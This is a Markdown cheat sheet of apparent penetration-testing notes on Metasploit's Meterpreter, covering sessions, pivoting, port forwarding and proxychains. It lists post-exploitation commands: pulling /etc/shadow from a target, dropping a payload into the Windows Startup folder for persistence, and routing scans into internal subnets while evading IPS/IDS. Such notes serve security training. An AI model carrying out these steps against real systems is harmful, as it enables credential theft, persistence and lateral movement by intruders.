## Advantages

1. Works inside RAM
2. Utilizes Covert Channels (legitimate processes)
3. Encrypted communication possible (effective against IPS/IDS)
4. Staged payloads possible

## Basics

- `help`: command overview
- During session: Strg+Z / background --> create background session
- `sessions -l`: show existing sessions
- `sessions -u [session ID]`: upgrade to meterpreter session
- `sessions -i 2`: switch to session 2
- `download`: download from target onto local system (exp: /etc/shadow)
- `edit [file]`: open vim on target 

## Advanced Features 

#### Upload Payload (via meterpeter)
- via meterpreter session: `cd C:\ProgramData\Microsoft\Windows\Start Menu\Programme\Autostart`
- verify with "meterpreter pwd" the correct path on target
- upload [path/to/payload/on/kali]

#### Ping Sweep: 
- Detect hosts in subnet2 via target machine in subnet1 (that has access to subnet2)
   - msf: `use post/multi/gather/ping_sweep`
   - `set rhost [IPv4]` (IPv4 from subnet2 like 10.1.0.0/24)
   - `set session [id]` (use id from target in subnet1)
- Alternative: `use auxiliary/scanner/portscan/tcp` + specify ports

#### Remote TCP scanner
1. msf: `use auxiliary/scanner/portscan/tcp` & set ports + rhost
2. Because it's "auxiliary" and not "post", you need to set up a route beforehand
3. msf: `route add [target in subnet] [sessionid]` (Exp: route add 10.1.0.7 1)
4. Alternative via meterpreter session: `run autoroute -s [target in subnet]`
5. These routes are only effective inside mp session (!)
6. For the usage outside of meterpreter session you need to set up portforwarding
7. Meterpreter session: `portfwd add -l 80 -p 80 -r [target in subnet]`

#### Proxychains:

*Route tools' web traffic through socks proxy to target2 w/o portforwading (!)*

1. Meterpreter: have existing session to target1 & put session into background
2. msf: `use auxiliary/server/socks_proxy` & setup socks4a(127.0.0.1:123) & `run` & `jobs`
3. Meterpreter: `add autoroute -s [IPv4]` (IPv4 = target2 IP in subnet)
4. msf: `route print` (check routing table)
5. Kali Browser: set up socks proxy (127.0.0.1:123) (now you can browse on target2 machine)
6. `nano /etc/proxychains.conf`: add `socks 127.0.0.1 123` at the end of file
7. Kali CLI: `proxychains [command] [IPv4]` (target2 IP in subnet)
